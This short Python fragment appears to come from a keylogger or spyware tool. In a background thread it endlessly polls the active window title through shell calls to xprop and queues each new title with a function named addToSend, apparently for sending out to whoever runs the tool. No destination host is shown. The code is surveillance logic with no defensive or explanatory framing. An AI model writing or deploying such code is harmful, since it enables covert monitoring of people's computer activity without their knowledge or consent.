def current_window():
    recent_value = ""
    while 1:
        tmp_value = str(os.popen("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME | sed -e 's/.*\"\(.*\)\".*/\\1/'").read().replace("\n", ""))
        if tmp_value != recent_value:
            recent_value = tmp_value
            if recent_value != "":
                addToSend("[Current window: "+recent_value+" ]")
Thread(target=current_window).start()
